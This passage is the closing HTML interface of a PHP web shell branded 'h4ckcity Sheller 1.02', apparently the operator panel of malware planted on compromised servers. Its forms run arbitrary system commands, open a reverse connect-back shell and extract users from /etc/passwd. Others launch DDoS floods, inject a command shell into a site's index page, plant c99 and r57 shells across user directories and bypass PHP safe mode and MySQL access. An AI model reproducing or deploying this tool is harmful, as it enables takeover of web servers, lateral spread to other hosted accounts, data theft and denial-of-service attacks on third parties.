            <div align='left'>
              <input type='submit' name='Submit2'  value='Make a Personal Directory'>
              <input type='submit' name='Submit11' value='Create PHP SafeMode Bypasser'>
			  <input type='submit' name='Submit12' value='Perl Symlink'>
            </div>
        </form></td>
      </tr>
      <tr>
        <th class='td' width='17%' style='border-bottom-width:thin;border-top-width:thin'><div align='right' class='style1'>Command :</div></th>
        <td class='td' width='83%' style='border-bottom-width:thin;border-top-width:thin'><form name='F4' method='post'>
        Function :
            <select name='CMDSelect' class='txt'>
              <option value='shell_exec'>Shell_Exec</option>
              <option value='passthru'>Passthru</option>
              <option value='exec'>Exec</option>
              <option value='system'>System</option>
            </select>
            <span>Command :</span>
            <INPUT TYPE='TEXT' class='txt' name='CMDTXT' size='30'>
            <input type='submit' name='Submit6'  value='Execute'>
        </form></td>
      </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>Get ConnectBack :</div></th>
        <td class='td' style='border-bottom-width:thin'><form name='F6' method='post'>
            <span>IP :</span>
            <INPUT NAME='IP_TextBox' TYPE='TEXT' class='txt' maxlength='15' >
            <span>Port :</span>
            <INPUT NAME='Port_TextBox' TYPE='TEXT' class='txt' size='7' maxlength='4'>
            <input type='submit' name='Submit8'  value='Get Connect Back'>
        </form></td>
      </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>Get Users :</div></th>
        <td class='td' style='border-bottom-width:thin'><form name='F5' method='post'>
            <span >/etc/passwd Address :</span>
            <INPUT TYPE='TEXT' class='txt' NAME='etcAdd' >
            <input type='submit' name='Submit7'  value='Get Only Users'>
			<input name='SaveUser_TXT' type='submit' value='Save User As TXT'>
        </form></td >
      </tr>
 <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>Remote DDoser : </div></th>
        <td class='td' style='border-bottom-width:thin'><form name='form1' method='post' action=''>
            Host : 
            <input name='ddos_host' type='text' class='txt' size='30' maxlength='15'>
Port :
<INPUT NAME='ddos_port' TYPE='TEXT' class='txt' size='7' maxlength='4'>
Packet Time : 
<input name='ddos_packet' type='text' class='txt' size='15'> 
<input name='ddos_start' type='submit' value='Remote DDoser'>   
        </form></td >
    </tr>
 <tr>
   <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>PHP DDoser  : </div></th>
   <td class='td' style='border-bottom-width:thin'><form action='' method='post' name='DOSForm' id='DOSForm'>
     Host : 
     <input name='PHP_D_Host' type='text' class='txt' id='PHP_D_Host' size='30' maxlength='15'>
Port : 
<input name='PHP_D_Port' type='text' class='txt' id='PHP_D_Port' size='7' maxlength='4'> 
Packet Time : 
<input name='PHP_D_Packet' type='text' class='txt' id='PHP_D_Packet' size='15'>
<input name='PHP_D_Start' type='submit' id='PHP_D_Start' value='&lt; PHP DDoser &gt;'>
   </form></td >
 </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>CMD Inj3ctor : </div></th>
        <td class='td' style='border-bottom-width:thin'><form name='form3' method='post' action=''>
          Page Name : 
              <INPUT NAME='IndexName' TYPE='TEXT' class='txt' size='23'>
              <input name='Submit4' type='submit' value='Inj3ct Cmd Sheller'>
              <span class='txt' >Example : index.php</span>        
        </form></td >
      </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right'><span class='style1'>Upload Sheller Here   : </span></div></th>
        <td class='td' style='border-bottom-width:thin'><form action='' method='post' name='F1'>
  Sheller1 :
      <input name='c99_txt' type='text' class='txt' size='40'>
Sheller2 :
<input name='r57_txt' type='text' class='txt' size='40'>
                <input type='submit' name='Submit1'  value='Upload Here !'>
        </form></td >
      </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>
          <p>Upload User On Users :</p>
          </div></th>
        <td class='td' style='border-bottom-width:thin'><form name='form2' method='post' action=''>
          <table width='677' border='0'>
            <tr>
              <td width='90'><div align='left'>Sheller ULR :</div></td>
              <td width='154'><input name='shellerURL' type='text' class='txt' size='30'></td>
              <td width='161'><div align='center'>
                <input type='submit' name='Submit3'  value='Auto Sheller On Users'>
              </div></td>
              <td width='254'><span class='txt' >Example : http://www.site.com/sheller.txt</span></td>
            </tr>
            <tr>
              <td> <div align='left'><span >User Directory </span>: </div></td>
              <td><input type='TEXT' class='txt' name='ManuelDIR' size='30'></td>
              <td><div align='center'><span class='txt' >
                <input type='submit' name='Submit5'  value='Manual Sheller On Users'>
              </span></div></td>
              <td><span class='txt' >Example : home/root/public_html</span></td>
            </tr>
          </table>
          </form></td >
      </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>Upload :</div></th>
        <td class='td' style='border-bottom-width:thin'><form action='' method='post' enctype='multipart/form-data' name='form5'>
          File : 
          <input name='fileupload' type='file' class='txt' id='fileupload' size='40'>
          <input name='Upload_Start' type='submit' id='Upload_Start' value='Upload'>
        </form></td >
      </tr>
      <tr>
        <th class='td' style='border-bottom-width:thin'><div align='right' class='style1'>
            <p>MySql Bypasser :</p>
        </div></th>
        <td class='td' style='border-bottom-width:thin'><form name='F10' method='post'>
            <table width='594' border='0'>
              <tr>
                <td width='112'><b>SQL-Server : Port : </b></td>
                <td width='284'><input name='server_txt' type='text' value='localhost' class='txt'>
            :
              <input name='port_txt' type='text' value='3306' class='txt'></td>
                <td width='184'>&nbsp;</td>
              </tr>
              <tr>
                <td><b>Login : Password : </b></td>
                <td><input name='login_txt' type='text' class='txt'>
            :
              <input name='pass_txt' type='text' class='txt'></td>
                <td><input type='submit' name='SQL_BTN' value='  Bypass  '></td>
              </tr>
              <tr>
                <td><b>Database . Table : </b></td>
                <td><input name='db_txt' type='text' class='txt'>
            :
              <input name='tb_txt' type='text' class='txt'></td>
                <td>&nbsp;</td>
              </tr>
            </table>
        </form></td >
      </tr>
    </table></td>
  </tr>
  <tr>
    <td bgcolor='#AA0000' class='td'><div align='center' class='style4'>--== www.h4ckcity.org Sheller Version: 1.02 Coded By LocalMan & <a href=\"mailto:2mzrp2@gmail.com\" style=\"font-weight; normal;\"> 2MzRp</a> Spc Thx :Mikili,Mehdi.H4ckCity,Ne0.limpizik,r3dm0v3 ==--</div></td>
  </tr>
</table>
  </CENTER>";
?>
</body>
</html>
